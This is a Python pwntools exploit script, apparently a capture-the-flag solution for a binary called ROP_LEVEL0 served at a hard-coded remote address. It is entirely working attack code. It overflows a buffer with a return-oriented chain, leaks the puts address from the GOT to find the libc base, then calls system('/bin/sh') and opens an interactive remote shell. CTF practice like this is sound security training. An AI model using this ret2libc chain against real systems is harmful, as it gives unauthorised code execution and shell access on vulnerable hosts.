#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
# context.log_level = "debug"
if debug == 1:
    p = process('./ROP_LEVEL0')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 20003)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./ROP_LEVEL0', checksec=False)
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
rop_pop_rdi_ret = 0x400753
addr_vuln = 0x400636


pd = 'a' * 0x58
pd += p64(rop_pop_rdi_ret)
pd += p64(got_puts)
pd += p64(plt_puts)
pd += p64(addr_vuln)
p.sendafter('You can not only cat flag but also Opxx Rexx Wrxxx ./flag\n', pd)

addr_puts = u64(p.recv(6).ljust(8, '\x00'))
libcbase = addr_puts - libc.sym['puts']
addr_system = libcbase + libc.sym['system']
addr_bin_sh = libcbase + libc.search('/bin/sh').next()

pd = 'a' * 0x18
pd += p64(rop_pop_rdi_ret)
pd += p64(addr_bin_sh)
pd += p64(addr_system)
pd += p64(addr_vuln)
p.send(pd)
p.interactive()
